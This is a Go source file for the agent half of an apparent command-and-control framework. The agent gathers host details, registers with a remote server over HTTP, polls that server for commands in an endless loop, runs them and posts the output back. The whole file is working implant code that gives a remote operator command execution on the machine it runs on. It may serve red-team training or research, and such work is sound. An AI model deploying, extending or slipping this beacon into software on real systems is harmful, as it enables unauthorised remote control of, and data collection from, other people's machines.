// The agent which executes commands and sends results back to the server
package agent

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/MeHungr/peanut-butter/internal/api"
	"github.com/MeHungr/peanut-butter/internal/pberrors"
)

// Agent has an api.Agent embedded, and creates additional methods
// and fields for use in the agent package
type Agent struct {
	api.Agent
	Debug bool
	*http.Client
}

// New creates a new Agent with sensible defaults.
func New(id, serverIP string, serverPort int, callbackInterval time.Duration, debug bool) *Agent {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	return &Agent{
		Agent: api.Agent{
			ID:               id,
			AgentIP:          GetLocalIP(),
			ServerIP:         serverIP,
			ServerPort:       serverPort,
			CallbackInterval: callbackInterval,
			Hostname:         hostname,
			OS:               runtime.GOOS,
			Arch:             runtime.GOARCH,
		},
		Debug:  debug,
		Client: &http.Client{Timeout: 10 * time.Second}, // good default
	}
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "?.?.?.?"
	}
	for _, addr := range addrs {
		// Filters out loopback addresses
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "?.?.?.?"
}

func (a *Agent) ToAPI() api.Agent {
	return api.Agent{
		ID:               a.ID,
		OS:               a.OS,
		Arch:             a.Arch,
		AgentIP:          a.AgentIP,
		ServerIP:         a.ServerIP,
		ServerPort:       a.ServerPort,
		CallbackInterval: a.CallbackInterval,
		Hostname:         a.Hostname,
		LastSeen:         a.LastSeen,
	}
}

// Register allows the agent to register with the server
func (a *Agent) Register() error {
	agent := a.ToAPI()
	uri := fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort)
	var resp api.Message

	// POST request with agent as body, writes response to resp
	if err := api.DoPost(a.Client, uri, agent, &resp); err != nil {
		return fmt.Errorf("Register: %w", err)
	}

	// Print server response
	if a.Debug {
		log.Println(resp.Message)
	}

	return nil
}

// GetTask retrieves a task from the server to be executed
// This function needs to handle its own response codes, so custom logic is needed
func (a *Agent) GetTask() (*api.Task, error) {
	url := fmt.Sprintf("http://%s:%d/task", a.ServerIP, a.ServerPort)

	// Marshals the agent's id into JSON
	body, err := json.Marshal(map[string]string{
		"agent_id": a.ID,
	})
	if err != nil {
		return nil, fmt.Errorf("Failed to marshal JSON: %w", err)
	}

	// POST request with the agent's id as the body
	resp, err := a.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("Failed to send POST request: %w", err)
	}
	defer resp.Body.Close()

	// Read the body of the response
	respBody, _ := io.ReadAll(resp.Body)
	switch resp.StatusCode {
	case http.StatusNoContent:
		return nil, nil // No task available

	case http.StatusBadRequest:
		// If agent ID is unregistered, reregister
		if strings.Contains(string(respBody), "Invalid agent ID") {
			if a.Debug {
				log.Printf("Agent ID %s no longer recognized, re-registering...", a.ID)
			}
			return nil, pberrors.ErrInvalidAgentID
		} else { // Else, throw error for bad request
			return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
		}

	case http.StatusOK:
		// Decodes the JSON body into a Task
		var agentTask api.Task
		if err := json.Unmarshal(respBody, &agentTask); err != nil {
			return nil, fmt.Errorf("Failed to decode task JSON: %w", err)
		}
		return &agentTask, nil

	default:
		// Throw other errors
		return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))

	}
}

// ExecuteTask executes the task retrieved by GetTask
func (a *Agent) ExecuteTask(task *api.Task) (*api.Result, error) {
	if strings.TrimSpace(task.Payload) == "" {
		return &api.Result{Output: "No task payload"}, nil
	}

	// Declares the result and its agent id
	result := &api.Result{
		Task: *task,
	}

	switch task.Type {
	case api.Command:
		result.Output, result.ReturnCode = executeCommand(task)
	default:
		return result, fmt.Errorf("Undefined task type in JSON: %s", task.Type)
	}

	return result, nil
}

// SendResult sends a result from an agent to the server
func (a *Agent) SendResult(result *api.Result) error {
	uri := fmt.Sprintf("http://%s:%d/result", a.ServerIP, a.ServerPort)
	var resp api.Message

	// Ensures result is not a nil pointer
	if result == nil {
		return fmt.Errorf("result is nil")
	}

	// Send POST request with result, prints message if debug is on
	if err := api.DoPost(a.Client, uri, result, &resp); err != nil {
		if a.Debug {
			log.Println(resp.Message)
		}
	}

	return nil
}

// registerUntilDone has the agent attempt to register with the server until it is accepted
func (a *Agent) registerUntilDone() {
	for {
		if err := a.Register(); err != nil {
			if a.Debug {
				log.Println(err)
			}
			time.Sleep(5 * time.Second)
			continue
		}
		break
	}
}

// Start starts the agent and begins the main polling loop
func (a *Agent) Start() {
	if a.Debug {
		log.Printf("Agent starting with ID: %s\n", a.ID)
	}

	// Attempt to register with the server until successful
	a.registerUntilDone()

	// Main polling loop
	for {
		task, err := a.GetTask()
		if err != nil {
			if errors.Is(err, pberrors.ErrInvalidAgentID) {
				if a.Debug {
					log.Printf("Agent ID %s invalid, re-registering...", a.ID)
				}
				a.registerUntilDone()
				continue
			}
			if a.Debug {
				log.Println("GetTask error:", err)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		if task != nil {
			result, err := a.ExecuteTask(task)
			if err != nil {
				if a.Debug {
					log.Println("ExecuteTask error:", err)
				}
				continue
			}
			if err := a.SendResult(result); err != nil {
				if a.Debug {
					log.Println("SendResult error:", err)
				}
			}
		}

		time.Sleep(a.CallbackInterval)
	}
}
